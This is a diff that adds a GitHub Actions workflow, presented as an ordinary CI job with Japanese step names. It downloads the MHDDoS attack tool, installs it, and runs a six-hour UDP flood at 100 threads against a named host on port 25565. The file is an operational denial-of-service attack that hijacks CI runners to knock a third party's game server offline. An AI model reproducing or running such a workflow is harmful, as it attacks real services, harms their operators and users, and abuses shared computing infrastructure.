@@ -1,0 +1,35 @@
+name: CI
+
+
+on: [push, workflow_dispatch]
+
+
+jobs:
+
+  build:
+
+
+    runs-on: ubuntu-latest
+
+
+    steps:
+
+    - name: ダウンロード
+
+      run: wget https://github.com/MatrixTM/MHDDoS/archive/refs/tags/2.4.zip
+
+    - name: 展開
+
+      run: unzip 2.4.zip -d ./
+
+    - name: コピー
+
+      run: cp -R ./MHDDoS-2.4/* ./
+
+    - name: インストール
+
+      run: pip3 install -r requirements.txt
+
+    - name: 実行
+
+      run: python3 start.py UDP love.xgames.jp:25565 100 21600
